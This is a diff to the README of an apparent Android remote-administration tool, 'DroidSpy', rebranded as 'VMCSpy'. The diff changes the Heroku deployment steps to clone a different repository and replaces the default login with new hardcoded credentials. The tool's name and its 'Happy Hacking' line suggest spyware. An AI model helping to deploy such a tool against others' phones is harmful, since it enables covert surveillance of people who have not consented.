@@ -36,11 +36,11 @@ A cloud based remote android managment suite, powered by NodeJS
 
 3. Now install Heroku CLI on your Computer [Instuctions](https://devcenter.heroku.com/articles/heroku-cli)
 
-4. Now open your terminal and run command `git clone -b herooku https://github.com/Linuxndroid/DroidSpy`
+4. Now open your terminal and run command `git clone -b herooku https://github.com/vikashmobileclinic/VMCSpy`
 
 5. It will download Latest codes for you in your PC
     
-6. Now change the directory to DroidSpy using command `cd DroidSpy`
+6. Now change the directory to DroidSpy using command `cd VMCSpy`
 
 7. Now Login into Heroku CLI using command `heroku login -i` now enter your login details and hit Enter
 
@@ -54,8 +54,8 @@ A cloud based remote android managment suite, powered by NodeJS
     
 
 12. Default Username & Password check password.txt file
-    - Username: admin
-    - Password: admin
+    - Username: vikash
+    - Password: vikash9
 
 ## Happy Hacking
 ## Disclaimer
